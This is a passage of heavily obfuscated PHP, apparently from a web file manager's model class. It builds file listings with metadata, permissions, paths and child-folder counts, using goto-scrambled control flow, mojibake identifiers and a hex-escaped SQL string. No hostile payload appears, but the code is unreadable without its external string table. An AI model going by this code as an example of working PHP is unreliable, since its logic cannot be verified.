(!isset($E°÷íóì£Ã[$EÙİ¸áªÙ[397]])) { $E°÷íóì£Ã[$EÙİ¸áªÙ[397]] = 0; } $DÜ¢­ë…°Ü = $EÙİ¸áªÙ[398]; goto E„è©Çø¾; E·ÛÑöÂĞÃ: } protected function _makeOrder() { goto d»§ëİÙ…Ï; bŞ”ÙÅ²ƒ: $b‡’áŠÚä¯ = array($fá¾„±ÚÃà[402] => $fá¾„±ÚÃà[403], $fá¾„±ÚÃà[404] => $fá¾„±ÚÃà[405]); $cØåÙÅöÖŒ = array($fá¾„±ÚÃà[28] => $fá¾„±ÚÃà[28], $fá¾„±ÚÃà[77] => $fá¾„±ÚÃà[77], $fá¾„±ÚÃà[160] => $fá¾„±ÚÃà[372], $fá¾„±ÚÃà[378] => $fá¾„±ÚÃà[378], $fá¾„±ÚÃà[406] => $fá¾„±ÚÃà[379], $fá¾„±ÚÃà[187] => $fá¾„±ÚÃà[187], $fá¾„±ÚÃà[107] => $fá¾„±ÚÃà[107]); $f‚ó×’ãÑå = Input::get($fá¾„±ÚÃà[407], $fá¾„±ÚÃà[7], $dõ™ŠÁ¾Ä, array_keys($cØåÙÅöÖŒ)); goto fçŸ‘–åŸÌ; fçŸ‘–åŸÌ: $fùÔŠÎµİ¯ = Input::get($fá¾„±ÚÃà[408], $fá¾„±ÚÃà[7], $E³ã¬º‰Ò–, array_keys($b‡’áŠÚä¯)); if (!in_array($f‚ó×’ãÑå, array_keys($cØåÙÅöÖŒ))) { $f‚ó×’ãÑå = $fá¾„±ÚÃà[28]; } if (!in_array($fùÔŠÎµİ¯, array_keys($b‡’áŠÚä¯))) { $f‚ó×’ãÑå = $fá¾„±ÚÃà[402]; } goto EÂù†ÛÄ; d»§ëİÙ…Ï: $fá¾„±ÚÃà =& $_SERVER[ã®Â„Éæ¹¤]; $dõ™ŠÁ¾Ä = Model($fá¾„±ÚÃà[399])->get($fá¾„±ÚÃà[400]); $E³ã¬º‰Ò– = Model($fá¾„±ÚÃà[399])->get($fá¾„±ÚÃà[401]); goto bŞ”ÙÅ²ƒ; EÂù†ÛÄ: if ($f‚ó×’ãÑå == $fá¾„±ÚÃà[28]) { } $fŠ¥ìƒáôÈ = $fá¾„±ÚÃà[409] . $cØåÙÅöÖŒ[$f‚ó×’ãÑå] . $fá¾„±ÚÃà[50] . $b‡’áŠÚä¯[$fùÔŠÎµİ¯]; return $this->order(rtrim(trim($fŠ¥ìƒáôÈ), $fá¾„±ÚÃà[47])); goto bçÖÊÁå¬; bçÖÊÁå¬: } protected function _listDataApplyItem($Aô«òÎÙğÙ, $Fğ‡«¼¦”¾ = false) { $A¬ÉæÖÉĞ = array($Aô«òÎÙğÙ); $this->_listDataApply($A¬ÉæÖÉĞ, $Fğ‡«¼¦”¾); return $A¬ÉæÖÉĞ[0]; } protected function _listDataApply(&$eÅ³¼ÛŞ…‘, $eå¬âƒÔÎ´ = false) { goto C•¡Ê±ˆÄí; e¢†èÙÈİŞ: $this->_listAppendPath($eÅ³¼ÛŞ…‘); $this->_listAppendAuth($eÅ³¼ÛŞ…‘); $this->_listAppendSourceInfo($eÅ³¼ÛŞ…‘, $A“êë±åœÎ); goto eôÇäğ–¸å; C•¡Ê±ˆÄí: $d£ĞíÇƒëÎ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$eÅ³¼ÛŞ…‘) { $eÅ³¼ÛŞ…‘ = array(); return; } $A“êë±åœÎ = array_to_keyvalue($eÅ³¼ÛŞ…‘, $d£ĞíÇƒëÎ[33], $d£ĞíÇƒëÎ[369]); goto d‚‚ò‘–Ë; eôÇäğ–¸å: $this->_listAppendUser($eÅ³¼ÛŞ…‘); $this->_listFilterInfo($eÅ³¼ÛŞ…‘, $eå¬âƒÔÎ´); goto eùÀ¸»‹; d‚‚ò‘–Ë: $A“êë±åœÎ = array_unique($A“êë±åœÎ); $this->_listSourceCache($eÅ³¼ÛŞ…‘); if (!$eå¬âƒÔÎ´) { $this->_listAppendMeta($eÅ³¼ÛŞ…‘, $A“êë±åœÎ); $this->_listAppendFileMeta($eÅ³¼ÛŞ…‘, $A“êë±åœÎ); $this->_listAppendChildren($eÅ³¼ÛŞ…‘, $A“êë±åœÎ); } goto e¢†èÙÈİŞ; eùÀ¸»‹: } protected function _listSourceCache($D´¦¹¹ƒÅ¿) { $bÊ‹ÖÏÌŸê =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($D´¦¹¹ƒÅ¿ as $fÊ˜ÛÆ×ã ) { self::$cacheSourceInfo[$bÊ‹ÖÏÌŸê[410] . $fÊ˜ÛÆ×ã [$bÊ‹ÖÏÌŸê[369]]] = $fÊ˜ÛÆ×ã ; } } protected function _listFilterInfo(&$b‚›­²ƒ , $fåßƒÌ´ñ = false) { $c×ìá®¤ˆ =& $_SERVER[ã®Â„Éæ¹¤]; foreach ($b‚›­²ƒ  as &$eÍ®è¡ˆ·æ) { $eÍ®è¡ˆ·æ = $this->pathInfoFilter($eÍ®è¡ˆ·æ); self::$cachePathInfo[$c×ìá®¤ˆ[411] . intval($fåßƒÌ´ñ) . $c×ìá®¤ˆ[412] . $eÍ®è¡ˆ·æ[$c×ìá®¤ˆ[369]]] = $eÍ®è¡ˆ·æ; } unset($eÍ®è¡ˆ·æ); } protected function _listMake(&$FŠÙ¿‡×ì) { $F¸‡ì˜° =& $_SERVER[ã®Â„Éæ¹¤]; $FŠÙ¿‡×ì[$F¸‡ì˜°[74]] = array(); $FŠÙ¿‡×ì[$F¸‡ì˜°[73]] = array(); foreach ($FŠÙ¿‡×ì[$F¸‡ì˜°[354]] as $cİÚ­¼ñ) { $aƒËš‰‰¢Ì = $cİÚ­¼ñ[$F¸‡ì˜°[370]] == 1 ? $F¸‡ì˜°[74] : $F¸‡ì˜°[73]; $FŠÙ¿‡×ì[$aƒËš‰‰¢Ì][] = $cİÚ­¼ñ; } unset($FŠÙ¿‡×ì[$F¸‡ì˜°[354]]); } protected function _listAppendMeta(&$dµÌÌóìš, $D’áöàÌç) { goto Bƒ§âÆ«öÆ; BËÊ„í²¡È: if (!$eÕñõ‘æ ƒ) { return; } $D—Ï­öÙÚ‘ = array($Eˆ‡·á°[415], $Eˆ‡·á°[416]); $aá‚Åõˆˆ± = array(); goto EÎ‚ÅÃîêá; EÎ‚ÅÃîêá: foreach ($eÕñõ‘æ ƒ as $BÎ††ô”‹§) { if (!isset($aá‚Åõˆˆ±[$BÎ††ô”‹§[$Eˆ‡·á°[369]]])) { $aá‚Åõˆˆ±[$BÎ††ô”‹§[$Eˆ‡·á°[369]]] = array(); } if (in_array($BÎ††ô”‹§[$Eˆ‡·á°[89]], $D—Ï­öÙÚ‘)) { continue; } $aá‚Åõˆˆ±[$BÎ††ô”‹§[$Eˆ‡·á°[369]]][$BÎ††ô”‹§[$Eˆ‡·á°[89]]] = $BÎ††ô”‹§[$Eˆ‡·á°[359]]; } foreach ($dµÌÌóìš as &$dºˆ…ƒ„·) { $dºˆ…ƒ„·[$Eˆ‡·á°[417]] = !1; if (isset($aá‚Åõˆˆ±[$dºˆ…ƒ„·[$Eˆ‡·á°[369]]])) { $dºˆ…ƒ„·[$Eˆ‡·á°[417]] = $aá‚Åõˆˆ±[$dºˆ…ƒ„·[$Eˆ‡·á°[369]]]; } if ($this->fileIsLock($dºˆ…ƒ„·) && $dºˆ…ƒ„·[$Eˆ‡·á°[376]]) { $a´’÷áªÜ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $dºˆ…ƒ„·[$Eˆ‡·á°[376]][$Eˆ‡·á°[377]] = AuthModel::authDisable($dºˆ…ƒ„·[$Eˆ‡·á°[376]][$Eˆ‡·á°[377]], $a´’÷áªÜ); $dºˆ…ƒ„·[$Eˆ‡·á°[376]][$Eˆ‡·á°[418]][$Eˆ‡·á°[376]] = $dºˆ…ƒ„·[$Eˆ‡·á°[376]][$Eˆ‡·á°[377]]; } } unset($dºˆ…ƒ„·); goto e˜ÜÈäÅ¯•; Bƒ§âÆ«öÆ: $Eˆ‡·á° =& $_SERVER[ã®Â„Éæ¹¤]; $aìæ»Á†æÈ = array($Eˆ‡·á°[383] => array($Eˆ‡·á°[384], $D’áöàÌç)); $eÕñõ‘æ ƒ = Model($Eˆ‡·á°[413])->field($Eˆ‡·á°[414])->where($aìæ»Á†æÈ)->select(); goto BËÊ„í²¡È; e˜ÜÈäÅ¯•: } protected function _listAppendFileMeta(&$Cğø‘¸ÖÖŒ, $B³À‡Ï’‰…) { goto CöğÏÜ‚ ‹; Eå¦ô¤±¸İ: if (!$A‘”¡²Ü©Ğ) { return; } $dâ¦‚¯Şßà = array($b®ÁÍ…Ó…[420] => array($b®ÁÍ…Ó…[384], $A‘”¡²Ü©Ğ)); $eŞ²ÌõË = $b®ÁÍ…Ó…[421]; goto eÚŠìÚ™ô½; D¸çŒ¾à¨‘: foreach ($Cğø‘¸ÖÖŒ as &$e¸‚Á‘ì°ò) { goto F‚ËÛ¼ƒØ; eÇ…è³«¤ù: $f›˜ëõ‘˜†[$b®ÁÍ…Ó…[77]] = $e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[77]]; $f›˜ëõ‘˜†[$b®ÁÍ…Ó…[28]] = $e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[28]]; self::$cacheFileInfo[$b®ÁÍ…Ó…[425] . $CºÇˆ„´†º] = array_merge(array(), $f›˜ëõ‘˜†); goto f•ÔÌŞæ ; F‚ËÛ¼ƒØ: $CºÇˆ„´†º = $e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[419]]; if (!$CºÇˆ„´†º || !isset($EÕƒø·² ‘[$CºÇˆ„´†º])) { continue; } $f›˜ëõ‘˜† = $EÕƒø·² ‘[$CºÇˆ„´†º]; goto eÇ…è³«¤ù; f•ÔÌŞæ : unset($EÕƒø·² ‘[$CºÇˆ„´†º][$b®ÁÍ…Ó…[75]]); $b’Ïí¤­Š = is_array($B‘åÕ¶ ¼[$CºÇˆ„´†º]) ? $B‘åÕ¶ ¼[$CºÇˆ„´†º] : array(); $e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[162]] = array_merge($b’Ïí¤­Š, $EÕƒø·² ‘[$CºÇˆ„´†º]); goto f˜¿âõ‚Çó; f˜¿âõ‚Çó: if (isset($e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[162]][$b®ÁÍ…Ó…[426]])) { $e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[426]] = json_decode($e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[162]][$b®ÁÍ…Ó…[426]], !0); unset($e¸‚Á‘ì°ò[$b®ÁÍ…Ó…[162]][$b®ÁÍ…Ó…[426]]); } goto Cß…İ—Ü“; Cß…İ—Ü“: } unset($e¸‚Á‘ì°ò); goto cø‹ÅºÎ‡­; BÛœé¿î¤: $bˆèïÍñË = $bˆèïÍñË ? $bˆèïÍñË : array(); $B‘åÕ¶ ¼ = array(); foreach ($bˆèïÍñË as $CºôÔ†Û¥Ø) { if (!isset($B‘åÕ¶ ¼[$CºôÔ†Û¥Ø[$b®ÁÍ…Ó…[419]]])) { $B‘åÕ¶ ¼[$CºôÔ†Û¥Ø[$b®ÁÍ…Ó…[419]]] = array(); } $B‘åÕ¶ ¼[$CºôÔ†Û¥Ø[$b®ÁÍ…Ó…[419]]][$CºôÔ†Û¥Ø[$b®ÁÍ…Ó…[89]]] = $CºôÔ†Û¥Ø[$b®ÁÍ…Ó…[359]]; } goto D¸çŒ¾à¨‘; eÚŠìÚ™ô½: $EÕƒø·² ‘ = Model($b®ÁÍ…Ó…[422])->field($eŞ²ÌõË)->where($dâ¦‚¯Şßà)->select(); $EÕƒø·² ‘ = array_to_keyvalue($EÕƒø·² ‘, $b®ÁÍ…Ó…[419]); $bˆèïÍñË = Model($b®ÁÍ…Ó…[423])->field($b®ÁÍ…Ó…[424])->where($dâ¦‚¯Şßà)->select(); goto BÛœé¿î¤; CöğÏÜ‚ ‹: $b®ÁÍ…Ó… =& $_SERVER[ã®Â„Éæ¹¤]; $A‘”¡²Ü©Ğ = array_to_keyvalue($Cğø‘¸ÖÖŒ, $b®ÁÍ…Ó…[33], $b®ÁÍ…Ó…[419]); $A‘”¡²Ü©Ğ = array_filter(array_unique($A‘”¡²Ü©Ğ)); goto Eå¦ô¤±¸İ; cø‹ÅºÎ‡­: } protected function _listAppendSourceInfo(&$cÃñ¯¿ÜÂß, $CÄèÉ„¦‰) { goto AÜí¥¾šŸÇ; eï”…·ÓÃ: $AàÌë”¦Ë¢ = array_to_keyvalue($DƒÈì¶µ˜™, $CÈï÷°ƒ¤[367]); $AÌ¤íî…±” = array_to_keyvalue_group($A¶ŞŒ¹äõï, $CÈï÷°ƒ¤[75], $CÈï÷°ƒ¤[393]); $F’¸Ñêˆ®¶ = array_to_keyvalue($b³ÊĞ¯Öèæ, $CÈï÷°ƒ¤[75]); goto f§‘¶Õ½µç; f§‘¶Õ½µç: $BˆÉİ®™œ = array_to_keyvalue_group($ağƒô‡…Òó, $CÈï÷°ƒ¤[369]); foreach ($cÃñ¯¿ÜÂß as &$F¢ŠÇÍ›Ÿš) { $F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[391]] = array($CÈï÷°ƒ¤[430] => 0, $CÈï÷°ƒ¤[431] => 0, $CÈï÷°ƒ¤[432] => 0); if (isset($F’¸Ñêˆ®¶[$F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[369]]])) { $F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[391]][$CÈï÷°ƒ¤[433]] = 1; $F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[391]][$CÈï÷°ƒ¤[434]] = $F’¸Ñêˆ®¶[$F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[369]]][$CÈï÷°ƒ¤[28]]; } if (isset($AÌ¤íî…±”[$F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[369]]])) { $F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[391]][$CÈï÷°ƒ¤[435]] = array(); foreach ($AÌ¤íî…±”[$F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[369]]] as $fÆêò››®) { $fƒ‚£¡¬ª† = $AàÌë”¦Ë¢[$fÆêò››®]; $F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[391]][$CÈï÷°ƒ¤[435]][] = array($CÈï÷°ƒ¤[436] => $fƒ‚£¡¬ª†[$CÈï÷°ƒ¤[367]], $CÈï÷°ƒ¤[386] => $fƒ‚£¡¬ª†[$CÈï÷°ƒ¤[28]], $CÈï÷°ƒ¤[437] => $fƒ‚£¡¬ª†[$CÈï÷°ƒ¤[438]]); } } if (isset($BˆÉİ®™œ[$F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[369]]])) { $F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[391]][$CÈï÷°ƒ¤[439]] = array(); foreach ($BˆÉİ®™œ[$F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[369]]] as $FÑÉ…²Ì‡È) { $F¢ŠÇÍ›Ÿš[$CÈï÷°ƒ¤[391]][$CÈï÷°ƒ¤[439]] = array($CÈï÷°ƒ¤[440] => $FÑÉ…²Ì‡È[$CÈï÷°ƒ¤[441]], $CÈï÷°ƒ¤[442] => $FÑÉ…²Ì‡È[$CÈï÷°ƒ¤[443]], $CÈï÷°ƒ¤[444] => $FÑÉ…²Ì‡È[$CÈï÷°ƒ¤[369]], $CÈï÷°ƒ¤[445] => $FÑÉ…²Ì‡È[$CÈï÷°ƒ¤[446]], $CÈï÷°ƒ¤[447] => $FÑÉ…²Ì‡È[$CÈï÷°ƒ¤[448]], $CÈï÷°ƒ¤[449] => $FÑÉ…²Ì‡È[$CÈï÷°ƒ¤[449]], $CÈï÷°ƒ¤[450] => $FÑÉ…²Ì‡È[$CÈï÷°ƒ¤[450]]); } } } unset($F¢ŠÇÍ›Ÿš); goto CåØ‹ë‡à; CåØ‹ë‡à: return $cÃñ¯¿ÜÂß; goto AÃòÕª­Àå; AÜí¥¾šŸÇ: $CÈï÷°ƒ¤ =& $_SERVER[ã®Â„Éæ¹¤]; if (!defined($CÈï÷°ƒ¤[427])) { return; } $DƒÈì¶µ˜™ = Model($CÈï÷°ƒ¤[428])->listData(); goto f¤Ê´êİ¼; f¤Ê´êİ¼: $A¶ŞŒ¹äõï = Model($CÈï÷°ƒ¤[392])->listData(); $b³ÊĞ¯Öèæ = Model($CÈï÷°ƒ¤[381])->listData(); $ağƒô‡…Òó = Model($CÈï÷°ƒ¤[429])->listSimple(); goto eï”…·ÓÃ; AÃòÕª­Àå: } protected function _listAppendChildren(&$CÈ™Ë„¯Á, $Ağªœ°ˆ…) { goto aÀˆÕëÀƒ; aÀˆÕëÀƒ: $Fçğ­‡¿Ä =& $_SERVER[ã®Â„Éæ¹¤]; $BÇ±§Ü¾ƒ = $Fçğ­‡¿Ä[361]; $BÇ«¥‡¾İ¼ = array(); goto Aå¹Ëä¼÷; fëÒ×”²ö: $bö¹†¨ğ²Ÿ = $this->tablePrefix . $this->tableName; for ($Eœê¦Ö×ˆ— = 0; $Eœê¦Ö×ˆ— < $B‚ô¢¸£ƒ; $Eœê¦Ö×ˆ—++) { $A¨Ô¬Ïšˆ¥ = intval($CÈ™Ë„¯Á[$Eœê¦Ö×ˆ—][$Fçğ­‡¿Ä[397]]); if ($CÈ™Ë„¯Á[$Eœê¦Ö×ˆ—][$Fçğ­‡¿Ä[370]]) { $côàêÖëâ¨ = $CÈ™Ë„¯Á[$Eœê¦Ö×ˆ—][$Fçğ­‡¿Ä[369]]; $BÇ±§Ü¾ƒ .= "\x53\105\x4c\105\x43\x54\40\x2a\40\106\x52\117\115\40\x28\x53\105\x4c\x45\103\x54\x20\47{$côàêÖëâ¨}\x5f\x68\141\x73\106\151\x6c\x65\47\x20\x61\x73\40\x68\x61\x73\54\x63\x6f\x75\x6e\x74\50\x31\51\x20\x61\x73\40\150\141\x73\103\x6f\165\156\164\x20\x46\x52\x4f\x4d\x20\x60{$bö¹†¨ğ²Ÿ}\140\x20\xa\x9\x9\x9\x9\x9\x77\x68\x65\162\145\x20\160\141\162\x65\x6e\164\111\x44\x3d{$côàêÖëâ¨}\40\141\x6e\144\x20\151\x73\106\x6f\154\144\x65\162\75\x30\x20\141\156\144\x20\x69\163\x44\x65\154\x65\164\145\75{$A¨Ô¬Ïšˆ¥}\51\x20\141\163\x20\164\142\61\137{$côàêÖëâ¨}\x20\x75\x6e\x69\157\156\x20\141\154\x6c\x20\xa\x9\x9\x9\x9\x9\x53\105\x4c\x45\103\124\40\52\x20\106\122\117\x4d\40\50\123\105\114\105\103\124\40\47{$côàêÖëâ¨}\x5f\x68\x61\163\x46\x6f\x6c\x64\x65\162\x27\x20\141\163\x20\x68\141\163\x46\151\154\x65\x2c\x63\157\x75\156\164\50\61\x29\x20\x61\163\x20\x68\x61\x73\x43\157\x75\156\x74\40\106\122\117\x4d\x20\x60{$bö¹†¨ğ²Ÿ}\x60\x20\xa\x9\11\11\11\11\x77\x68\145\162\x65\x20\x70\x61\x72\145\156\x74\111\x44\75{$côàêÖëâ¨}\x20\141\156\x64\x20\151\163\x46\157\x6c\144\145\x72\75\61\40\x61\x6e\x64\40\x69\x73\x44\x65\154\145\164\x65\75{$A¨Ô¬Ïšˆ¥}\51\40\x61\x73\40\164\142\62\x5f{$côàêÖëâ¨}\x20\x75\156\151\x6f\156\40\x61\154\x6c\40"; } if ((strlen($BÇ±§Ü¾ƒ) >= $A§ùÀœô´« || $Eœê¦Ö×ˆ— == $B‚ô¢¸£ƒ - 1) && $BÇ±§Ü¾ƒ) { $BÇ±§Ü¾ƒ = substr($BÇ±§Ü¾ƒ, 0, -strlen($Fçğ­‡¿Ä[451])); $eÔ±±æ¸¨³ = $this->query($BÇ±§Ü¾ƒ); $BÇ«¥‡¾İ¼ = array_merge($BÇ«¥‡¾İ¼, $eÔ±±æ¸¨³); $BÇ±§Ü¾ƒ = $Fçğ­‡¿Ä[33]; } } $BÇ«¥‡¾İ¼ = array_to_keyvalue($BÇ«¥‡¾İ¼, $Fçğ­‡¿Ä[452]); goto AŸçÛƒÇİ˜; AŸçÛƒÇİ˜: foreach ($CÈ™Ë„¯Á as &$eË™ ±‹¦ì) { if ($eË™ ±‹¦ì[$Fçğ­‡¿Ä[370]]) { unset($eË™ ±‹¦ì[$Fçğ­‡¿Ä[372]]); $eË™ ±‹¦ì[$Fçğ­‡¿Ä[192]] = intval($BÇ«¥‡¾İ¼[$eË™ ±‹¦ì[$Fçğ­‡¿Ä[369]] . $Fçğ­‡¿Ä[453]][$Fçğ­‡¿Ä[454]]); $eË™ ±‹¦ì[$Fçğ­‡¿Ä[191]] = intval($BÇ«¥‡¾İ¼[$eË™ ±‹¦ì[$Fçğ­‡¿Ä[369]] . $Fçğ­‡¿Ä[455]][$Fçğ­‡¿Ä[454]]); } } unset($eË™ ±‹¦ì); goto e’ÒÕáË–Ö; Aå¹Ëä¼÷: $A§ùÀœô´« = 1024 * 50; $CÈ™Ë„¯Á = is_array($CÈ™Ë„¯Á) ? $CÈ™Ë„¯Á : array(); $B‚ô¢¸£ƒ = count($CÈ™Ë„¯Á); goto fëÒ×”²ö; e’ÒÕáË–Ö: } protected function _listAppendAuth(&$bõÛù’‚ğá) { goto BàŒÉèî; b„½“ˆ™¬ä: $fğÍàİÃ÷ø = Model($F¡½Ô„ÚÇñ[456])->getSourceList($Fô‡˜àËİÒ, $aíôø°å); foreach ($bõÛù’‚ğá as $dŒ¨¶³›¿ => &$f‚¬µ–Õ×æ) { $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[376]] = $fğÍàİÃ÷ø[$f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[369]]]; if (!$f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[376]] && $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[371]] == self::TYPE_GROUP) { $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[376]] = Action($F¡½Ô„ÚÇñ[457])->pathGroupAuthMake($f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[458]]); if (!$f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[376]] && !_get($GLOBALS, $F¡½Ô„ÚÇñ[459])) { $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[189]] = !1; $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[188]] = !1; } } if ($f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[376]]) { $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[189]] = AuthModel::authCheckEdit($f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[376]][$F¡½Ô„ÚÇñ[377]]); $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[188]] = AuthModel::authCheckView($f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[376]][$F¡½Ô„ÚÇñ[377]]); } $this->groupPathDisplay($f‚¬µ–Õ×æ); } unset($f‚¬µ–Õ×æ); goto eĞ’‘ÉÍ‡; eßƒÃ­‡óµ: foreach ($bõÛù’‚ğá as $f‚¬µ–Õ×æ) { if ($f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[371]] == self::TYPE_GROUP) { $Fô‡˜àËİÒ[] = $f‚¬µ–Õ×æ[$F¡½Ô„ÚÇñ[369]]; } } if (!$Fô‡˜àËİÒ) { return; } $aíôø°å = array_to_keyvalue($bõÛù’‚ğá, $F¡½Ô„ÚÇñ[369]); goto b„½“ˆ™¬ä; BàŒÉèî: $F¡½Ô„ÚÇñ =& $_SERVER[ã®Â„Éæ¹¤]; if (!defined($F¡½Ô„ÚÇñ[427])) { return; } $Fô‡˜àËİÒ = array(); goto eßƒÃ­‡óµ; eĞ’‘ÉÍ‡: } public function groupPathDisplay(&$b£Ó‚÷—ø¯) { goto B»’¢îŒ; AÂŸõ˜’«ç: $b£Ó‚÷—ø¯[$FÙ«ˆÄÌÊ»[462]] = $e¾Ä‰Ãàöã[$FÙ«ˆÄÌÊ»[463]]; $b£Ó‚÷—ø¯[$FÙ«ˆÄÌÊ»[380]] = $e¾Ä‰Ãàöã[$FÙ«ˆÄÌÊ»[461]]; $b£Ó‚÷—ø¯[$FÙ«ˆÄÌÊ»[464]] = $e¾Ä‰Ãàöã[$FÙ«ˆÄÌÊ»[465]]; goto cãïƒ—Ü×‰; B»’¢îŒ: $FÙ«ˆÄÌÊ» =& $_SERVER[ã®Â„Éæ¹¤]; if ($b£Ó‚÷—ø¯[$FÙ«ˆÄÌÊ»[371]] != self::TYPE_GROUP) { return; } $e¾Ä‰Ãàöã = Model($FÙ«ˆÄÌÊ»[460])->getInfo($b£Ó‚÷—ø¯[$FÙ«ˆÄÌÊ»[458]]); goto a¼é´è‡£„; cãïƒ—Ü×‰: $b£Ó‚÷—ø¯[$FÙ«ˆÄÌÊ»[466]] = $b²‚Ğ¾×¹ . $e¾Ä‰Ãàöã[$FÙ«ˆÄÌÊ»[391]][$FÙ«ˆÄÌÊ»[369]]; goto fÀóÂŞ¬; a¼é´è‡£„: $eçæº¨ÚÔî = $this->parentLevelArray($e¾Ä‰Ãàöã[$FÙ«ˆÄÌÊ»[461]]); $b²‚Ğ¾×¹ = $FÙ«ˆÄÌÊ»[33]; foreach ($eçæº¨ÚÔî as $CäÄÌÏÅ¹£) { $BéÈ”‡ìÑ¸ = Model($FÙ«ˆÄÌÊ»[460])->getInfo($CäÄÌÏÅ¹£); $b²‚Ğ¾×¹ .= $BéÈ”‡ìÑ¸[$FÙ«ˆÄÌÊ»[391]][$FÙ«ˆÄÌÊ»[369]] . $FÙ«ˆÄÌÊ»[47]; } goto AÂŸõ˜’«ç; fÀóÂŞ¬: } protected function _listAppendPath(&$d­®Îãî¥») { goto eºÛ›÷âĞ; f•ÙÉïãÀå: foreach ($d­®Îãî¥» as &$b³ô®©ÁÙã) { $B˜òñêˆØß[$b³ô®©ÁÙã[$EŒÒé‰Ä™±[369]]] = $b³ô®©ÁÙã[$EŒÒé‰Ä™±[28]]; $cé¤ ­º˜ = $this->parentLevelArray($b³ô®©ÁÙã[$EŒÒé‰Ä™±[461]]); foreach ($cé¤ ­º˜ as $d•Úßê‹õñ => $BÛö‘ìéÙˆ) { if ($d•Úßê‹õñ != 0 && !isset($B˜òñêˆØß[$BÛö‘ìéÙˆ])) { $D®©¡Êê•[] = $BÛö‘ìéÙˆ; } } } unset($b³ô®©ÁÙã); if (count($D®©¡Êê•) > 0) { $DÇ¼è²îô– = array($EŒÒé‰Ä™±[383] => array($EŒÒé‰Ä™±[384], $D®©¡Êê•)); if (count($D®©¡Êê•) == 1) { $aïÅ£¬Ô¢ä = $this->sourceInfo($D®©¡Êê•[0]); $B“ø‚»¡í = is_array($aïÅ£¬Ô¢ä) ? array($aïÅ£¬Ô¢ä) : !1; } else { $B“ø‚»¡í = $this->field($EŒÒé‰Ä™±[467])->where($DÇ¼è²îô–)->select(); } $eØ¹¾æòê = array_to_keyvalue($B“ø‚»¡í, $EŒÒé‰Ä™±[369], $EŒÒé‰Ä™±[28]); $B˜òñêˆØß = array_merge_index($B˜òñêˆØß, $eØ¹¾æòê); } goto a™Ï‹Æìæ¢; eºÛ›÷âĞ: $EŒÒé‰Ä™± =& $_SERVER[ã®Â„Éæ¹¤]; static $B˜òñêˆØß = array(); $D®©¡Êê• = array(); goto f•ÙÉïãÀå; aÇï¸‹áìä: return $d­®Îãî¥»; goto féóÎªá¼; a™Ï‹Æìæ¢: $EÍÅëîÒç± = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($d­®Îãî¥» as &$b³ô®©ÁÙã) { goto E²Æ³¤ª†š; D§à¬¤å×Ï: if ($cé¤ ­º˜) { $F©öÔÌ¢ãÎ .= $b³ô®©ÁÙã[$EŒÒé‰Ä™±[28]]; } if ($b³ô®©ÁÙã[$EŒÒé‰Ä™±[370]]) { $F©öÔÌ¢ãÎ .= $EŒÒé‰Ä™±[8]; } $b³ô®©ÁÙã[$EŒÒé‰Ä™±[468]] = str_replace($EŒÒé‰Ä™±[469], $EŒÒé‰Ä™±[8], $F©öÔÌ¢ãÎ); goto fïòø¡„¦; E²Æ³¤ª†š: $cé¤ ­º˜ = $this->parentLevelArray($b³ô®©ÁÙã[$EŒÒé‰Ä™±[461]]); $F©öÔÌ¢ãÎ = $this->_listAppendPathRoot($b³ô®©ÁÙã, $cé¤ ­º˜); foreach ($cé¤ ­º˜ as $d•Úßê‹õñ => $BÛö‘ìéÙˆ) { if ($d•Úßê‹õñ == 0 && $F©öÔÌ¢ãÎ && $b³ô®©ÁÙã[$EŒÒé‰Ä™±[371]] == self::TYPE_GROUP) { continue; } if (isset($B˜òñêˆØß[$BÛö‘ìéÙˆ])) { $F©öÔÌ¢ãÎ .= $B˜òñêˆØß[$BÛö‘ìéÙˆ] . $EŒÒé‰Ä™±[8]; } } goto D§à¬¤å×Ï; fïòø¡„¦: $f®÷åöÈÏ– = trim($b³ô®©ÁÙã[$EŒÒé‰Ä™±[468]], $EŒÒé‰Ä™±[8]); if ($b³ô®©ÁÙã[$EŒÒé‰Ä™±[463]] == $EŒÒé‰Ä™±[470] && $f®÷åöÈÏ–) { $b³ô®©ÁÙã[$EŒÒé‰Ä™±[28]] = $f®÷åöÈÏ–; } $this->_listAppendPathRecycle($b³ô®©ÁÙã, $cé¤ ­º˜, $EÍÅëîÒç±); goto bÂ»™Ğˆ˜Ò; bÂ»™Ğˆ˜Ò: } unset($b³ô®©ÁÙã); goto aÇï¸‹áìä; féóÎªá¼: } private function _listAppendPathRecycle(&$f¼Ô±¦—ã‰, $E‹ğ”°·Ã¹, 